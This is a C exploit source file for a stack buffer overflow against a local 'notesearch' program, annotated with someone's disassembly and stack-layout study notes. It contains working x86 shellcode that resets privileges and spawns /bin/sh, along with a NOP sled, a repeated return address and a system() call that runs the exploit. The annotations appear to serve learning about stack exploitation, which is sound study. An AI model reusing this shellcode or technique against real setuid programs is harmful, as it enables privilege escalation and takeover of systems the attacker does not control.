#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
	
			-------------------------- stack
				
			 0xbffff4ec:		    	<--- esp


			push %ebp

			-------------------------- stack
				
			 0xbffff4e8:		ebp		<--- esp


			mov	 %esp,%ebp
			push %edi					// ?

			-------------------------- stack
				
			 0xbffff4ec:		
			 0xbffff4e8:		ebp
			 0xbffff4e4:    edi   <--- esp


			and	 $0xfffffff0, %esp		// substracts four bytes
			-------------------------- stack
				
			 0xbffff4ec:		
			 0xbffff4e8:		ebp
			 0xbffff4e4:    edi 
			 0xbffff4e0:          <--- esp


			sub  $0x40,%esp
			-------------------------- stack
				
			 0xbffff4ec:		
			 0xbffff4e8:		ebp
			 0xbffff4e4:    edi 
			 0xbffff4e0:
			 0xbffff4dc:
			 0xbffff4d8:
			 0xbffff4d4:
			 0xbffff4d0:
			 0xbffff4cc:
			 0xbffff4c8:
			 0xbffff4c4:
			 0xbffff4c0:
			 0xbffff4bc:
			 0xbffff4b8:
			 0xbffff4b4:
			 0xbffff4b0:					
			 0xbffff4ac:
			 0xbffff4a8:
			 0xbffff4a4:
			 0xbffff4a0:			<--- esp

				
	unsigned int i, ret, offset=270;
	char *command, *buffer;
	command = (char *) malloc(200);

	strcpy(command, "./notesearch \'"); // Start command buffer.
	buffer = command + strlen(command); // Set buffer at the end.

	if(argc > 1) // Set offset.
		offset = atoi(argv[1]);
	ret = (unsigned int) &i - offset; // Set return address.
	for(i=0; i < 160; i+=4) // Fill buffer with return address.

				movl $0x0,0x2c(%esp)							# initialize i
				jmp  0x80485f1 <main+165>
				mov  0x2c(%esp),%edx							# store i to edx
				mov  0x34(%esp),%eax
			-------------------------- stack
				
			 0xbffff4ec:		
			 0xbffff4e8:		ebp
			 0xbffff4e4:    edi 
			 0xbffff4e0:
			 0xbffff4dc:
			 0xbffff4d8 <0x38 + esp>:	command=0x0804a008
			 0xbffff4d4	<0x34 + esp>:
			 0xbffff4d0 <0x30 + esp>:	ret=0xbffff35e
			 0xbffff4cc <0x2c + esp>:	i=0
			 0xbffff4c8:
			 0xbffff4c4:
			 0xbffff4c0:
			 0xbffff4bc:
			 0xbffff4b8:
			 0xbffff4b4:
			 0xbffff4b0:					
			 0xbffff4ac:
			 0xbffff4a8:
			 0xbffff4a4:
			 0xbffff4a0:			<--- esp
		
		*((unsigned int *)(buffer+i)) = ret;
	memset(buffer, 0x90, 60); // Build NOP sled.
	memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
	strcat(command, "\'");
	system(command); // Run exploit.
	free(command);

	return 0;
}
